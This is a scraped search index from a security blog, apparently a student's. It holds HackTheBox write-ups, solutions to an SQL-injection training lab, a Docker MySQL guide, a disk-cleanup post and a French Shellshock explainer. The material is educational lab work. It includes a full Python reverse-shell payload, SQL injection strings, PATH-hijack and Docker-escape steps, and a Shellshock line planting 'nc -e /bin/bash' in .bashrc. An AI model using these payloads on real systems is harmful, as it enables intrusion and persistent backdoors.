Server 5.7.31-1debian10 started. simple_db | 2021-03-25 10:54:04+00:00 [Note] [Entrypoint]: Initializing database files simple_db | 2021-03-25T10:54:04.578298Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details). simple_db | 2021-03-25T10:54:04.580054Z 0 [ERROR] --initialize specified but the data directory has files in it. Aborting. simple_db | 2021-03-25T10:54:04.580073Z 0 [ERROR] Aborting simple_db | simple_db exited with code 1 I was really surprised while reading this one, because the container was working well minutes before. After reading the documentation, and searching on the web for more info, nothing worked for me: the container would not run. I decided to check for docker-compose updates with my package manager, and guess what? No more space on my root partition üò´ Everybody who played around with Linux distro had one day this view: How to free disk space on Linux? I will try to show a couple of ways I managed to free space on my root partition. ","date":"2021-03-25","objectID":"/free-space-on-disk/:0:0","tags":["disk","linux","partition"],"title":"Free space on disk for Linux distros","uri":"/free-space-on-disk/"},{"categories":null,"content":"Package manager cache As I am running on Archlinux, my package manager might be different as yours (ie. I use pacman and not apt so be carefull). The first thing I did was to clear my pacman cache, because I knew it would free some space for sure: sudo pacman -Scc You can check this blog post which explains how to deal with pacman cache: With that I cleared almost 30G of data on my disk: ","date":"2021-03-25","objectID":"/free-space-on-disk/:1:0","tags":["disk","linux","partition"],"title":"Free space on disk for Linux distros","uri":"/free-space-on-disk/"},{"categories":null,"content":"Docker Yeah, freeing 30G is pretty satisfying, but imagine freeing more. Joking. But imagine anyway. I use Docker a lot, especially while working for school projects or CTFs, so I thought about checking my images and trying to free some more space. After running sudo docker images I realized I needed to clean those. I mean, there was like 100 images that I do not use anymore (yes, InterIUT challenges, I talk about you ü•≤ ). sudo docker images prune This freed 2G on the disk, I was happy about that, but I saw that Docker was still taking too much space here, like 15G could be saved. I realized that Docker volumes where still there, and I decided to remove them. sudo docker volume prune Leading me with a total of 40G freed in minutes! ","date":"2021-03-25","objectID":"/free-space-on-disk/:2:0","tags":["disk","linux","partition"],"title":"Free space on disk for Linux distros","uri":"/free-space-on-disk/"},{"categories":null,"content":"Sort disk usage While troubleshouting my disk usage, I used this command to sort by usage: sudo du / -x -d 1 | sort -n You can then investigate which directory is taking most usage on your disk. ","date":"2021-03-25","objectID":"/free-space-on-disk/:3:0","tags":["disk","linux","partition"],"title":"Free space on disk for Linux distros","uri":"/free-space-on-disk/"},{"categories":["HTB"],"content":" Cool box, maybe too easy for a medium? Got reverse shell in minutes, but stuck for root‚Äôs password for hours üòÖ ","date":"2021-03-20","objectID":"/htb-ready/:0:0","tags":["htb","writeup"],"title":"üì¶ HTB - Ready","uri":"/htb-ready/"},{"categories":["HTB"],"content":"TL;DR Gitlab RCE, get reverse shell. Privesc with cleartext root password, escape Docker to own the box. ","date":"2021-03-20","objectID":"/htb-ready/:1:0","tags":["htb","writeup"],"title":"üì¶ HTB - Ready","uri":"/htb-ready/"},{"categories":["HTB"],"content":"Footholds ","date":"2021-03-20","objectID":"/htb-ready/:2:0","tags":["htb","writeup"],"title":"üì¶ HTB - Ready","uri":"/htb-ready/"},{"categories":["HTB"],"content":"nmap Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-14 16:00 UTC Nmap scan report for 10.10.10.220 Host is up (0.035s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 5080/tcp open http nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.36 seconds We get an NGINX service running on port 5080, and we know there is a GitLab on it. Let‚Äôs check it out! ","date":"2021-03-20","objectID":"/htb-ready/:2:1","tags":["htb","writeup"],"title":"üì¶ HTB - Ready","uri":"/htb-ready/"},{"categories":["HTB"],"content":"Entrypoint First thing I did was creating an account to see what‚Äôs up with this GitLab. Unfortunately, there is no open projects we can mess with: A common reflex here is to check the version of the service, let‚Äôs go to /help: This seems very interesting for us! What do we have for this version? Well, we can see there are a lot of exploits in the wild. Let‚Äôs use the first we find: https://github.com/dotPY-hax/gitlab_RCE python gitlab_rce.py http://ready.htb:5080 10.10.14.28 We follow the instructions, and create a listener with netcat: nc -vlnp 42069 Connection from 10.10.10.220:39478 bash: cannot set terminal process group (509): Inappropriate ioctl for device bash: no job control in this shell git@gitlab:~/gitlab-rails/working$ And we got a reverse shell! ","date":"2021-03-20","objectID":"/htb-ready/:3:0","tags":["htb","writeup"],"title":"üì¶ HTB - Ready","uri":"/htb-ready/"},{"categories":["HTB"],"content":"User Very simple user here: git@gitlab:~$ cat /home/dude/user.txt ","date":"2021-03-20","objectID":"/htb-ready/:4:0","tags":["htb","writeup"],"title":"üì¶ HTB - Ready","uri":"/htb-ready/"},{"categories":["HTB"],"content":"Upgrade shell We want a good shell here: git@gitlab:~$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ^Z ninja@null $ stty raw -echo; fg git@gitlab:~$ We want to get root now. ","date":"2021-03-20","objectID":"/htb-ready/:4:1","tags":["htb","writeup"],"title":"üì¶ HTB - Ready","uri":"/htb-ready/"},{"categories":["HTB"],"content":"Root The classical privesc enumerators, like linenum, linpeas or lse are telling us we are in a Docker container. We will firstly try to get root in the container in order to escape from it later. ","date":"2021-03-20","objectID":"/htb-ready/:5:0","tags":["htb","writeup"],"title":"üì¶ HTB - Ready","uri":"/htb-ready/"},{"categories":["HTB"],"content":"Get root in container Running the enumeration scripts, we get some passwords on the system: Of course, there is no way a GitLab SMTP password could be root‚Äôs as well, right? ","date":"2021-03-20","objectID":"/htb-ready/:5:1","tags":["htb","writeup"],"title":"üì¶ HTB - Ready","uri":"/htb-ready/"},{"categories":["HTB"],"content":"Escape the container Now that we are root in the container, it is pretty easy to escape: mkdir /tmp/cheh mount /dev/sda2 /tmp/cheh ls /tmp/cheh cat /tmp/cheh/root/root.txt Reference: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root ","date":"2021-03-20","objectID":"/htb-ready/:5:2","tags":["htb","writeup"],"title":"üì¶ HTB - Ready","uri":"/htb-ready/"},{"categories":null,"content":"Some weeks ago I created a trainning lab for SQL injections called SQLi lab. And I will go through all levels in this blog post, explainning the expected way to solve each of them. The lab currently contains 5 levels, and I will update this post as I add more of them üëç ","date":"2020-08-20","objectID":"/sqli-lab/:0:0","tags":["article","ctf","sqli","writeup"],"title":"SQLi lab solutions","uri":"/sqli-lab/"},{"categories":null,"content":"Installation The GitHub repository is at https://github.com/OxNinja/SQLi-lab if you want more information. First I clone the lab in a folder, add its IP to my hosts file for conveignance, and then build it with the given script: git clone https://github.com/OxNinja/SQLi-lab.git cd SQLi-lab echo '172.16.0.2 sqli.lab' \u003e\u003e /etc/hosts ./build.sh Let‚Äôs wait for about 5-10 seconds for the MySQL container to boot, and then visit http://172.16.0.2, or http://sqli.lab, you should get this: We can now start level 1! ","date":"2020-08-20","objectID":"/sqli-lab/:1:0","tags":["article","ctf","sqli","writeup"],"title":"SQLi lab solutions","uri":"/sqli-lab/"},{"categories":null,"content":"Level 1 By reading the level‚Äôs introduction, we know that the admin uses a database with its passwords. We want to get them all, without having to guess the website. But first we need to know how the server works. By inputing a random website we get: The output is not that verbose, but we might be able to guess the SQL query made: SELECT password FROM my_table WHERE website='$website' So let‚Äôs try a basic injection, like ' or 1=1-- -: Okay we got him, we have the URL for the next level. ","date":"2020-08-20","objectID":"/sqli-lab/:2:0","tags":["article","ctf","sqli","writeup"],"title":"SQLi lab solutions","uri":"/sqli-lab/"},{"categories":null,"content":"Level 2 Here we need to retrieve the admin‚Äôs password. Let‚Äôs try admin:admin: Of course we don‚Äôt have anything. With the information we have, we can imagine the SQL query: SELECT username, mail, password FROM users WHERE username='$username' AND password='$password' We can try again with a basic injection ' or 1=1;-- -: It works fine üòä We could also have injected the payload in the password field: ","date":"2020-08-20","objectID":"/sqli-lab/:3:0","tags":["article","ctf","sqli","writeup"],"title":"SQLi lab solutions","uri":"/sqli-lab/"},{"categories":null,"content":"Level 3 An online shop! We must find what is hidding in there. But first, let‚Äôs use this product search input: Nothing really interesting üòê But we see a message on the page: ‚ÄòLogin is disabled for the moment.‚Äô what is this? Maybe we could see something in the source code? Bingo! We have an SQL query, but how can we use it? The only solution here is to make an UNION-based SQL injection. Let‚Äôs try it out: UNION SELECT * FROM level3_users Should do the trick. Our payload: ' UNION SELECT * FROM leve3_users;-- - Yes it works! We continue to the fourth level. ","date":"2020-08-20","objectID":"/sqli-lab/:4:0","tags":["article","ctf","sqli","writeup"],"title":"SQLi lab solutions","uri":"/sqli-lab/"},{"categories":null,"content":"Level 4 This level might be harder than the previous ones for some attackers. And it is normal üòà The page shows us some buttons we can click to get an article‚Äôs content: Note the ?id= parameter in the URL this could help us in the future. Let‚Äôs see the generated source code: How interesting, the server adds a comment containing the article‚Äôs id right before its content. Here we don‚Äôt have that much information. Our only escape could be ‚Äì again ‚Äì an UNION-based SQLi. Let‚Äôs try one: We don‚Äôt get anything from it, even if we provided an article‚Äôs id üòï The right thing to ask is: why? Why do we get nothing with our payload? Why is the article 3 not even rendered? In an UNION query, both SELECT statements must return the same number of columns! So maybe we are wrong, maybe there is not two columns in the server‚Äôs query. We can figure out the server‚Äôs query: SELECT * FROM articles WHERE id='$id' But how many columns are in there? We can count what we see on the page: the title and the content of the article‚Ä¶ AND the id! Those are three columns. Let‚Äôs try with three columns: We now have a second article rendered on the page! We can try to customize our payload to select strings or values: Nice it works as we want! We now want to know the database‚Äôs name: OK, now we want to know the tables of the database: Note the limit 1,1 at the end, we need it in order to retrieve one by one. Otherwise the UNION query will get an error because we want to SELECT more elements than the first statement. Here we get the table COLLATIONS, which is part of the MySQL‚Äôs server by default. We only want the tables from our database database: OK now we want to get the columns of this table: Continuing like this we get the database‚Äôs schema: CREATE DATABASE database; CREATE TABLE level4_articles (id int, title text, content text); CREATE TABLE level4_users (username text, password text); ","date":"2020-08-20","objectID":"/sqli-lab/:5:0","tags":["article","ctf","sqli","writeup"],"title":"SQLi lab solutions","uri":"/sqli-lab/"},{"categories":null,"content":"Level 5 We want to find the admin‚Äôs password. Let‚Äôs try the basic admin:admin: Of course we got a ‚ÄúWrong username/password‚Äù message. Maybe we can try a basic SQLi? Nice, the server think we are admin! But the goal here is to find the password, not to log as him. We now know that this form is vulnerable to SQL injections, and when we are logged as the admin we have a ‚ÄúWelcome admin‚Äù message. Maybe we can try a blind injection like so: Better! we transformed the query: # From: SELECT * FROM users WHERE username='$username' AND password='$password' # To: SELECT * FROM users WHERE username='admin' AND password='' OR password LIKE '%';-- -' Which can lead us to the admin‚Äôs password! Let‚Äôs continue like so: We now know that the first character of the password is not ‚Äúa‚Äù. Great! Moving on by changing the letter each time we get the first letter: ‚Äúf‚Äù We now have a method to find the whole password, so I will skip to the end untill the final check: After this point, no matter what the next character is, we get the ‚ÄúWrong username/password‚Äù message. This means that we reached the end of the password, let‚Äôs check it out: Great! We know the admin‚Äôs password now. To continue we have to get to the page /f05c8652de134d5c50729fa1b31d355b.php. On this page we are redirected to /win.php, meanning we got to the end of the lab. We just finished the last level of this lab! It was fun, wasn‚Äôt it? ","date":"2020-08-20","objectID":"/sqli-lab/:6:0","tags":["article","ctf","sqli","writeup"],"title":"SQLi lab solutions","uri":"/sqli-lab/"},{"categories":["HTB"],"content":"TL;DR HTTP redirect bypass (unintended üòÅ), PHP code execution through file upload to get a reverse shell. User with hardcoded SQL credentials on server, privesc with custom binary with no $PATH check. As I am an idiot, I reinstalled my distribution without making a backup of my files üôà So I don‚Äôt have any screenshot or payloads I used for this box to show you ","date":"2020-08-20","objectID":"/htb-magic/:1:0","tags":["htb","writeup"],"title":"üì¶ HTB - Magic","uri":"/htb-magic/"},{"categories":["HTB"],"content":"Footholds With a basic nmap we found only two ports: 22 and 80. The running web server seems to be a portfolio, we can also note a login page for the administrator. ","date":"2020-08-20","objectID":"/htb-magic/:2:0","tags":["htb","writeup"],"title":"üì¶ HTB - Magic","uri":"/htb-magic/"},{"categories":["HTB"],"content":"Entry point ","date":"2020-08-20","objectID":"/htb-magic/:3:0","tags":["htb","writeup"],"title":"üì¶ HTB - Magic","uri":"/htb-magic/"},{"categories":["HTB"],"content":"Admin page I thought it would be great to access this admin page, but I did not found any valid credentials to log myself in. What I did instead was: Use BurpSuite to intercept my requests to the /admin page Change the 302 -\u003e /login redirection code to 200 -\u003e /admin on response Now got access to the page without login-in Of course after reading other solutions, this one was really unintented, the ‚Äônormal‚Äô way was to make an SQL injection in the login form. ","date":"2020-08-20","objectID":"/htb-magic/:3:1","tags":["htb","writeup"],"title":"üì¶ HTB - Magic","uri":"/htb-magic/"},{"categories":["HTB"],"content":"File upload Now that we are on the admin page, we can upload some pictures in order to display them on the homepage. The first thing that came to my mind was to upload a PHP reverse shell: If we upload it and visit it we got our nice reverse shell working! ","date":"2020-08-20","objectID":"/htb-magic/:3:2","tags":["htb","writeup"],"title":"üì¶ HTB - Magic","uri":"/htb-magic/"},{"categories":["HTB"],"content":"User We are in the machine, but need to privesc as a user. Looking in the server‚Äôs directory I found an intersting db.php5 file: class Database { private static $dbName = 'Magic' ; private static $dbHost = 'localhost' ; private static $dbUsername = 'theseus'; private static $dbUserPassword = 'iamkingtheseus'; We try to log as the mentioned user with the given password. It does not works. Maybe it is some valid SQL credentials? I also found a mysqldump binary on the system, which ‚Äì pay attention ‚Äì dumps a given MySQL schema. $ mysqldumps -u theseus -p iamthekingtheseus --all-databases We then get a new password: admin:Th3s3usW4sK1ng. Maybe this one is the user‚Äôs password? We can log-in with theseus:Th3s3usW4sK1ng! ","date":"2020-08-20","objectID":"/htb-magic/:4:0","tags":["htb","writeup"],"title":"üì¶ HTB - Magic","uri":"/htb-magic/"},{"categories":["HTB"],"content":"Root We now need to get as root! By looking into /bin/ we get an interesting binary sysinfo running with UID=0 üòá This binary basically fetches information on the system and outputs it on stdout. Here, the vulnerability is: the binary executes some commands (such as lswh -short, lsblk -l‚Ä¶) without an absolute path to them. We can easilly create our own lswh binary and change our $PATH to trick this program to execute our code as root (UID=0)! This is what I did: $ cd /tmp $ mkdir .ninja \u0026\u0026 cd .ninja $ echo 'echo $(whoami)' \u003e lshw $ chmod +x lshw $ export PATH=/tmp/.ninja:$PATH $ sysinfo [...] ====================Hardware Info==================== root # \u003c-- our code execution! ===================================================== [...] By now we only have to cat /root/root.txt, or create ourselves a reverse shell, add our SSH key to the box, or anything! $ echo 'cat /root/root.txt' \u003e lshw $ sysinfo [...] ====================Hardware Info==================== [/root/root.txt hash here üòÄ] ===================================================== [...] Sorry for this bad writeup, I lost all my files, payloads and notes but I tryied my best. ","date":"2020-08-20","objectID":"/htb-magic/:5:0","tags":["htb","writeup"],"title":"üì¶ HTB - Magic","uri":"/htb-magic/"},{"categories":["HTB"],"content":" Obscurity is my first medium box so I was very happy when I got that root.txt :D ","date":"2020-04-12","objectID":"/htb-obscurity/:0:0","tags":["htb","writeup"],"title":"üì¶ HTB - Obscurity","uri":"/htb-obscurity/"},{"categories":["HTB"],"content":"TL;DR Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc. ","date":"2020-04-12","objectID":"/htb-obscurity/:1:0","tags":["htb","writeup"],"title":"üì¶ HTB - Obscurity","uri":"/htb-obscurity/"},{"categories":["HTB"],"content":"Footholds To make things easier, I added the box to my /etc/hosts. ","date":"2020-04-12","objectID":"/htb-obscurity/:2:0","tags":["htb","writeup"],"title":"üì¶ HTB - Obscurity","uri":"/htb-obscurity/"},{"categories":["HTB"],"content":"Recon Let‚Äôs start with nmap to discover the open ports : \u003e nmap -A obscurity.htb -o nmap.out Nmap scan report for obscurity.htb (10.10.10.168) Host is up (0.026s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA) | 256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA) |_ 256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519) 80/tcp closed http 8080/tcp open http-proxy BadHTTPServer | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 200 OK | Date: Fri, 10 Apr 2020 11:14:28 | Server: BadHTTPServer | ... |_http-server-header: BadHTTPServer |_http-title: 0bscura ... So we got so far SSH and HTTP server running on the machine. ","date":"2020-04-12","objectID":"/htb-obscurity/:2:1","tags":["htb","writeup"],"title":"üì¶ HTB - Obscurity","uri":"/htb-obscurity/"},{"categories":["HTB"],"content":"Web server On the port 8080 we can see the web server which indicates that it is hand-made with custom code. If you use custom code, you can‚Äôt have CVE‚Äôs on it. So your code is 100% secure. By reading the content of their homepage, we get a good hint : they are hosting the source code on the server. We have to find SuperSecureServer.py ont it ! ","date":"2020-04-12","objectID":"/htb-obscurity/:2:2","tags":["htb","writeup"],"title":"üì¶ HTB - Obscurity","uri":"/htb-obscurity/"},{"categories":["HTB"],"content":"Finding source code The easiest way I found on the moment was to fire up Burpsuite and use a directory wordlist. By making a first request to the webserver, I sent it to Burp‚Äôs intruder in sniper mode. Using a simple directory wordlist (common.txt) I placed the payload‚Äôs position as GET /¬ßa¬ß/SuperSecureServer.py, launched the attack and waited for burp to get a 200 response code. The source code is at /develop/SuperSecureServer.py ! ","date":"2020-04-12","objectID":"/htb-obscurity/:2:3","tags":["htb","writeup"],"title":"üì¶ HTB - Obscurity","uri":"/htb-obscurity/"},{"categories":["HTB"],"content":"Source code auditing By reading the code, I found that during the document serving process, the exec() function is called. def serveDoc(self, path, docRoot): path = urllib.parse.unquote(path) try: info = \"output = 'Document: {}'\" # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? \u003c-- here cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) if path == \"/\": path = \"/index.html\" ","date":"2020-04-12","objectID":"/htb-obscurity/:2:4","tags":["htb","writeup"],"title":"üì¶ HTB - Obscurity","uri":"/htb-obscurity/"},{"categories":["HTB"],"content":"Reverse shell After understanding when the exec was called, I injected a python reverse shell payload. Basically this is a command injection through format string, string which got evaluated right after. The payload we could manipulate was directly the path we GET on the server. My final payload for the reverse shell was : GET /';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\u003cIP\u003e\",\u003cPORT\u003e));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' This payload works because : The first ' is used to break the string generated by the format string Both ; to inject a new python code between The last ' is to make an empty string with the single quote from the source code, otherwise an error is raised So I just launched a netcat connexion listenning on my machine, and made a request on the server with the payload to get the shell. ","date":"2020-04-12","objectID":"/htb-obscurity/:2:5","tags":["htb","writeup"],"title":"üì¶ HTB - Obscurity","uri":"/htb-obscurity/"},{"categories":["HTB"],"content":"User The reverse shell we have is as www-data, we need to privesc as a regular user. \u003e ls /home robert We know that user robert must be the user we need to privesc as. We need to investigate it‚Äôs home directory. \u003e ls /home/robert BetterSSH check.txt out.txt passwordreminder.txt SuperSecureCrypt.py ... We got a bunch of files here, some are pretty interesting, especially the Python script. By examining it, we understand that Robert uses a custom password manager, stores it‚Äôs ‚Äúencrypted‚Äù password in a file, and tested it‚Äôs encryption passphrase on a dummy text file. First thing I did was to BF it‚Äôs password using the famous rockyou. But it was unsuccessfull, I managed to get something close to it‚Äôs password, but not the actual password. After thinking about the encryption and decryption algorithms, I managed to get the real password. To use the Python script : python SuperSecureCrypt.py -i infile -k key -o outfile will ‚Äúencypt‚Äù the content of infile with key into outfile. To decrypt we have to use the -d option. As the encryption and decryption where very simple : def encrypt(text, key): for x in text: newChr = chr( (ord(x) + ord(keyChr)) % 255 ) encrypted += newCrh def decrypt(text, key): for x in text: newChr = chr( (ord(x) - ord(keyChr)) % 255 ) decrypted += newChr The easiest way to get the password was : python SuperSecureCrypt.py -d -i out.txt -k \"$(cat check.txt)\" -o pass.txt The encryption password was alexandrovich. python SuperSecureCrypt.py -d -i passwordreminder.txt -k alexandrovich -o robert.txt Robert‚Äôs password was SecThruObsFTW, we can SSH as him and get the user.txt content. ","date":"2020-04-12","objectID":"/htb-obscurity/:3:0","tags":["htb","writeup"],"title":"üì¶ HTB - Obscurity","uri":"/htb-obscurity/"},{"categories":["HTB"],"content":"Root We now need to go root. As robert : \u003e sudo -l User robert may run the following commands on obscure: (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py So yeah, we know where to start. We now need to know how to exploit this BetterSSH.py script. By reading the first lines, we know that it reads the /etc/shadow file, and write it‚Äôs content into a file somewhere in /tmp/SSH/. The script prompts for a username and password, if the password‚Äôs hash does corresponds to the shadow one, it gives a shell as this user. I started to find a fancy way to monitor the content of the /tmp/SSH/ folder, but a simple bash script can do anything : #!/bin/bash while true; do cat /tmp/SSH/* \u003e\u003e /tmp/.ninja done I launched the script in background, launched the BetterSSH script too, and read the content of my /tmp/.ninja file. We get most of the users‚Äô hashes separated by line, but only one matters to us. Root‚Äôs hash was $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1. Using john the ripper on the hash, we get root‚Äôs password : mercedes. I could have SSH back as root, but there is already a tool for us : sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py, entered root for user, and mercedes for password, we now have a shell as root. ","date":"2020-04-12","objectID":"/htb-obscurity/:4:0","tags":["htb","writeup"],"title":"üì¶ HTB - Obscurity","uri":"/htb-obscurity/"},{"categories":null,"content":"Yeah, I wanted to do one of those for a long time üòÅ So, we have to stay at home for the moment, I decided to make a ‚Äúwalkthrough‚Äù about something I used sometimes and I couldn‚Äôt remember all the commands. So, let‚Äôs build our MySQL database within a Docker container üê≥ ! ","date":"2020-04-07","objectID":"/setup-your-database-with-docker/:0:0","tags":["article","docker","sql","walkthrough"],"title":"Setup your database with Docker","uri":"/setup-your-database-with-docker/"},{"categories":null,"content":"Get the Docker image I will be using the mysql image from the Docker hub. docker pull mysql ","date":"2020-04-07","objectID":"/setup-your-database-with-docker/:1:0","tags":["article","docker","sql","walkthrough"],"title":"Setup your database with Docker","uri":"/setup-your-database-with-docker/"},{"categories":null,"content":"Run the container For further details, you can read the official documentation for the image on Docker hub. I will just go through the basic steps I use. docker run --name my_container -e MYSQL_ROOT_PASSWORD=toor -d mysql:latest --name : setup a name for our container -e : setup environment variables MYSQL_ROOT_PASSWORD : need explainations ? -d : run in deamon mode mysql:latest : use the mysql image in the latest version ","date":"2020-04-07","objectID":"/setup-your-database-with-docker/:2:0","tags":["article","docker","sql","walkthrough"],"title":"Setup your database with Docker","uri":"/setup-your-database-with-docker/"},{"categories":null,"content":"Administrate the database Once the container is running in background, we have to connect to it : docker exec -it my_container /bin/bash Here, we connect to the running container and pop a shell in interactive mode. We have to connect to the database : mysql -uroot -ptoor Now we can start to use SQL commands for our database. ","date":"2020-04-07","objectID":"/setup-your-database-with-docker/:3:0","tags":["article","docker","sql","walkthrough"],"title":"Setup your database with Docker","uri":"/setup-your-database-with-docker/"},{"categories":null,"content":"Create the database CREATE DATABASE my_db; USE my_db ","date":"2020-04-07","objectID":"/setup-your-database-with-docker/:3:1","tags":["article","docker","sql","walkthrough"],"title":"Setup your database with Docker","uri":"/setup-your-database-with-docker/"},{"categories":null,"content":"Create the table CREATE TABLE compotes (id INT, name TEXT, note INT); ","date":"2020-04-07","objectID":"/setup-your-database-with-docker/:3:2","tags":["article","docker","sql","walkthrough"],"title":"Setup your database with Docker","uri":"/setup-your-database-with-docker/"},{"categories":null,"content":"Manipulate the table INSERT We want now to add some data in our table : INSERT INTO compotes (id, name, note) VALUES (0, \"Apple\", 3); INSERT INTO compotes (id, name, note) VALUES (1, \"Apple \u0026 banana\", 5), (2, \"Apple \u0026 pear\", 4), (3, \"Apple \u0026 apple\", 3); UPDATE Oh no, I f‚Äôcked up my data ! Apple \u0026 banana is not that tasty ! UPDATE compotes SET (note=4) WHERE id=1; Better. DELETE So drunk I added apple \u0026 apple in my table sight DELETE FROM compotes WHERE name=\"Apple \u0026 apple\"; OK, we are good. SELECT I want to see my beautiful compotes now ! SELECT * FROM compotes; SELECT name, note FROM compotes; SELECT * FROM compotes WHERE id \u003e 1 AND note = 3; ","date":"2020-04-07","objectID":"/setup-your-database-with-docker/:3:3","tags":["article","docker","sql","walkthrough"],"title":"Setup your database with Docker","uri":"/setup-your-database-with-docker/"},{"categories":null,"content":"Use SQL script We don‚Äôt want to re-type all the database when building a new container ! SQL scripts are cool for that : # populate.sql # SQL script to build the compotes table in our database create database my_db; use my_db create table compotes(id int, name text, note int); insert into compotes(id, text, note) values (0, \"Apple\", 3), (1, \"Apple \u0026 banana\", 5), (2, \"Apple \u0026 pear\", 4); And execute the script on the running container : docker exec -i my_container sh -c 'exec mysql -uroot -ptoor' \u003c populate.sql ","date":"2020-04-07","objectID":"/setup-your-database-with-docker/:4:0","tags":["article","docker","sql","walkthrough"],"title":"Setup your database with Docker","uri":"/setup-your-database-with-docker/"},{"categories":null,"content":"Shellshock est une vuln√©rabilit√© pr√©sente dans bash 4.3 et ant√©rieur. Il s‚Äôagit d‚Äôune vuln√©rabilit√© logicielle qui se base sur de l‚Äôinjection de commande en passant par les variables d‚Äôenvironement. C‚Äôest vachement cool car elle m√®ne √† une bonne grosse RCE des familles, donc c‚Äôest pas n√©gligeable üòò. ","date":"2020-02-28","objectID":"/la-vuln%C3%A9rabilite-shellshock/:0:0","tags":["apache","article","bash","ctf","web"],"title":"La vuln√©rabilit√© Shellshock","uri":"/la-vuln%C3%A9rabilite-shellshock/"},{"categories":null,"content":"Statistiques Quelques statistiques afin d‚Äôillustrer la port√©e et l‚Äôattention port√©e de la vuln√©rabilit√©. Shellshock a beaucoup √©t√© √† la mode quand elle est sortie, √©norm√©ment de trafic a √©t√© g√©n√©r√© par des botnets lors de tentatives d‚Äôexploitation de la vuln√©rabilit√©. Bon faut que je trouve des stats mais c‚Äôest un autre probl√®me ","date":"2020-02-28","objectID":"/la-vuln%C3%A9rabilite-shellshock/:1:0","tags":["apache","article","bash","ctf","web"],"title":"La vuln√©rabilit√© Shellshock","uri":"/la-vuln%C3%A9rabilite-shellshock/"},{"categories":null,"content":"Comment √ßa marche ? env _='() { echo \"Yeah ma boi\"; }; echo \"nc -e /bin/bash $IP $PORT\" \u003e\u003e ~/.bashrc;'; bash -c 'echo \"Bonjour √† tous\"' L√† on force l‚Äôutilisateur √† lancer un shell sur $IP:$PORT √† chaque fois qu‚Äôil va ouvrir un shell, mais on peut immaginer d‚Äôinnombrables autres sc√©narios d‚Äôattaque, de compromission de machine, ou de porte d√©rob√©e. Pour comprendre le fonctionnement de cette payload, on va la prendre par √©tape. ","date":"2020-02-28","objectID":"/la-vuln%C3%A9rabilite-shellshock/:2:0","tags":["apache","article","bash","ctf","web"],"title":"La vuln√©rabilit√© Shellshock","uri":"/la-vuln%C3%A9rabilite-shellshock/"},{"categories":null,"content":"Les fonctions dans bash Si vous n‚Äô√™tes pas connaisseur, il est possible de cr√©er des fonctions dans bash directement, la syntaxe est la suivante : my_function () { echo \"Hello\" } # Ou plus explicitement function my_function () { echo \"Hello\" } Pour l‚Äôex√©cuter on peut l‚Äôappeller de cette mani√®re : $ my_function Hello ","date":"2020-02-28","objectID":"/la-vuln%C3%A9rabilite-shellshock/:2:1","tags":["apache","article","bash","ctf","web"],"title":"La vuln√©rabilit√© Shellshock","uri":"/la-vuln%C3%A9rabilite-shellshock/"},{"categories":null,"content":"Utiliser une variable d‚Äôenvironnement avec bash Les variables d‚Äôenvironnement permettent de g√©rer pas mal de choses, mais principalement de passer des valeurs d‚Äôun programme √† un autre, sans passer par des √©tapes compliqu√©es. Note : les variables type $PATH, $SHELL, $PWD, $TERM‚Ä¶ sont des variables d‚Äôenvironnement, utilisables par des programmes. En bash : $ env BoC='ovgr bh pbhvyyr' $ env | grep BoC BoC=ovgr bh pbhvyyr # On a bien notre nouvelle variable d'environnement # On peut aussi d√©clarer une fonction : $ env my_function='() { echo \"aHR0cHM6Ly9ncGguaXMvMWEzWDV0UQ==\" | base64 -d; }' On peut m√™me les utiliser dans un sous-shell : $ env my_function='() { echo \"aHR0cHM6Ly9ncGguaXMvMWEzWDV0UQ==\" | base64 -d; }'; bash -c 'my_function;' L‚Äôutilisation de variables d‚Äôenvironnement dans des sous-shells a √©t√© supprim√©e depuis, mais si vous voulez quand m√™me tester, Docker ou VM üòâ ","date":"2020-02-28","objectID":"/la-vuln%C3%A9rabilite-shellshock/:2:2","tags":["apache","article","bash","ctf","web"],"title":"La vuln√©rabilit√© Shellshock","uri":"/la-vuln%C3%A9rabilite-shellshock/"},{"categories":null,"content":"Injection La partie sympa de Shellshock, c‚Äôest qu‚Äôon pouvait injecter une commande √† ex√©cuter via les variables d‚Äôenvironnement, en ajoutant la commande √† la suite de la d√©claration d‚Äôune fonction : $ env a='() { echo \"This is my function\"; }; echo \"Not in the func\"'; bash -c 'a;' Not in the func # Ne devrait pas √™tre appel√© ! This is my function Donc ouais, Shellshock c‚Äôest quand m√™me vachement cool üòé. 